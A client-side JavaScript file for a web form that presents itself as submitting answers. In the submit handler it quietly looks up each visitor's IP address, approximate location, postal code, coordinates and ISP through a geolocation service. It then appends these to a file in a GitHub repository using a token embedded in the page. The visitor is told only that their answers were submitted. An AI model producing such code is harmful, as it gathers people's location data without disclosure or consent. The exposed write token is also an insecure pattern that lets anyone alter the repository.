$(document).ready(function(){
    if($("#submit").show()){
        $("#submit").hide();
    }

    $('input[name="mode"]').click(function(){
        $("#submit").show();
    });

    $("#submit").click(async function(event){
        event.preventDefault();
        const mode = $('input[name="mode"]:checked').val();
        const additionalInfo = $('#additionalInfo').val();

        $.getJSON('https://ipapi.co/json/', async function(data) {
            const content = {
                mode: mode,
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                currency: data.currency,
                org: data.org,
                asn: data.asn,
                request: data.request,
                additionalInfo: additionalInfo // Include additional information
            };

            const token = 'YOUR_GITHUB_TOKEN'; // Replace with your GitHub token
            const repo = 'YOUR_GITHUB_USERNAME/YOUR_REPO_NAME'; // Replace with your GitHub repo
            const path = 'data.txt'; // Path to your data.txt file in the repo

            const getFileContent = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
                headers: {
                    'Authorization': `token ${token}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });

            const fileData = await getFileContent.json();
            const existingContent = atob(fileData.content);
            const newContent = existingContent + '\n' + JSON.stringify(content, null, 2);

            await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${token}`,
                    'Accept': 'application/vnd.github.v3+json'
                },
                body: JSON.stringify({
                    message: 'Update data.txt',
                    content: btoa(newContent),
                    sha: fileData.sha
                })
            });
        });
    });
    $("#submit").click(function(){
        window.location.href = "1.html";
        alert("Answers has been submitted successfully!");
    });
});